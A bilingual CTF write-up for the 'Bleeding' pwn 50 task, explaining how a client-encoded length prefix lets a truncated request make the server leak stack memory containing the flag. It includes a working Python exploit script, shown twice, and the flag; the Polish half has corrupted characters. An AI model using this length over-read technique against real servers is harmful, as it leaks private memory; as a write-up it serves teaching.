# Bleeding (pwn 50)

###ENG
[PL](#pl-version)

For the task we get a [client](bleed_client) ELF binary and a server address to connect to.
The client asks us for some seed word, performs some calculations on it and sends the result to the server.
The server responds with `secure` password generated from our input and with our seed word.

The encoded data sent by client to server have 10 more bytes than our seed word.
We tried reversing the encoding algorithm, which consisted of xors, additions and subtractions but we quickly realised that it's not necessary.
The length of the seed word is encoded in the 10-bytes prefix added by client!

This meant that we could generate payload for a 512 bytes long seed and then send to the server only the initial 10 bytes.
The server would then try to sent back the seed to us, but would try to send 512 bytes, where there were 0, which resulted in sending random bytes from server stack, flag included.

```python
import socket
from time import sleep


def encode():
    # full payload: 'ef9e8dd834ffbabea6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b2860a00'
	# only prefix
    return 'ef9e8dd834ffbabea6d5'.decode('hex')


def main():
    url = "4ff0eff1d46c1d74d152aaf36de6f2799020bdbc.ctf.site"
    port = 50000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url, port))
    sleep(1)
    s.sendall(encode())
    sleep(1)
    received = s.recv(9999)
    print(received)
    print(received.encode("hex"))


main()
```

`EKO{1m_bl33d1ng_byt35}`

###PL version

W zadaniu dostajemy [klienta](bleed_client) b??d??cego linuxowm ELFem, oraz adres serwera do kt??rego nale??y si?? po????czy??.
Klient pyta nas o dowolny ci??g, wykonuje na nim obliczenia i wysy??a do serwera.
Serwer odpowiada `bezpiecznym` has??em wygenerowanym dla naszych danych, oraz ci??giem kt??ry podali??my.

Zakodowane przez klienta dane maj?? o 10 bajt??w wi??cej ni?? ci??g kt??ry podajemy.
Pr??bowali??my pocz??tkowo zreversowa?? algorytm kodowania, z??o??ony z xor??w, dodawa?? i odejmowa??, ale szybko zobaczyli??my, ??e nie ma takiej potrzeby.
D??ugo???? naszego ci??gu by??a zakodowana w 10-bajtowym prefixie dodawanym przez klienta do naszego ci??gu.

To oznacza ??e mogli??my wygenerowa?? klientem dane dla 512 bajtowego ci??gu a potem wys??a?? do serwera jedynie pierwsze 10 bajt??w.
Serwer pr??bowa?? odes??a?? nam nasze dane o d??ugo??ci 512 bajt??w, podczas gdy wys??ali??my 0, co spowodowa??o wys??anie losowych warto??ci ze stosu serwera, w tym flagi.

```python
import socket
from time import sleep


def encode():
    # full payload: 'ef9e8dd834ffbabea6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b286c2c6a6d5c697b2860a00'
	# only prefix
    return 'ef9e8dd834ffbabea6d5'.decode('hex')


def main():
    url = "4ff0eff1d46c1d74d152aaf36de6f2799020bdbc.ctf.site"
    port = 50000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((url, port))
    sleep(1)
    s.sendall(encode())
    sleep(1)
    received = s.recv(9999)
    print(received)
    print(received.encode("hex"))


main()
```

`EKO{1m_bl33d1ng_byt35}`
